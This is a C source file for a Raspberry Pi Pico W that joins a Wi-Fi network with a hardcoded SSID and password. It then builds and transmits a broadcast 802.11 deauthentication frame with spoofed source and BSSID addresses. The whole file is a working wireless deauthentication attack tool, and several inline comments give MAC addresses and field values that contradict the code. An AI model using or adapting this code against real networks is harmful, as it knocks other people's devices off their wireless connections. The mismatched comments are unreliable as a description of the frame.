#include <stdio.h>
#include "deauth/deauth.h"
#include "pico/stdlib.h"
#include "pico/cyw43_arch.h"

#define SSID "the-aquarium"
#define PASSWD "withpassionandethics"

int main()
{    
    stdio_init_all();
    sleep_ms(3000);
    if (cyw43_arch_init()) {
        printf("failed to initialise\n");
        return 1;
    }

    cyw43_arch_enable_sta_mode();
    if (joinAP(SSID, PASSWD)) {
        printf("successfully joined network %s\n", SSID);
        printf("starting deauth...");
    }

    struct pbuf *p, *q;
    u16_t pbuf_len;
    struct ieee_80211_hdr* deauth_hdr;
    
    pbuf_len = sizeof(struct ieee_80211_hdr);
    p = pbuf_alloc(PBUF_RAW, pbuf_len, PBUF_POOL);
    for(q = p; q != NULL; q = q->next) {
        memset(q->payload, 0, q->len);
    }
    
    const struct eth_addr ethaddr_dest = {{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}};
    const struct eth_addr ethaddr_src = {{0xFA, 0x94, 0xC2, 0x07, 0xF5, 0x3A}};
    const struct eth_addr ethaddr_bssid = {{0xFA, 0x94, 0xC2, 0x07, 0xF5, 0x3A}};

    deauth_hdr = (struct ieee_80211_hdr*)p->payload;
    /* fill ieee_80211 header */
    deauth_hdr->frame_control_field = htons(DEAUTH_FRAME_CONTROL_FIELD);
    deauth_hdr->duration = htons(0x3a01);               // Duration				0x013a				(2 bytes)
    deauth_hdr->ethaddr_dest = ethaddr_dest;            // Recv/Dest Addr		e8:fb:e9:bc:c5:ff	(6 bytes)
    deauth_hdr->ethaddr_src = ethaddr_src;              // Trans/Src Addr		18:58:80:0b:a0:77	(6 bytes)
    deauth_hdr->ethaddr_bssid = ethaddr_bssid;          // BSS Id				18:58:80:0b:a0:79	(6 bytes)
    deauth_hdr->sequence_control = htons(0x0000);       // Fragment/Sequence No.	0x0820				(2 bytes)
    deauth_hdr->reason_code = htons(DEAUTH_REASON_NON_ASSOCIATED_STA);            // Reason Code				0x0007				(2 bytes) 

    deauth_blocking(p);
}

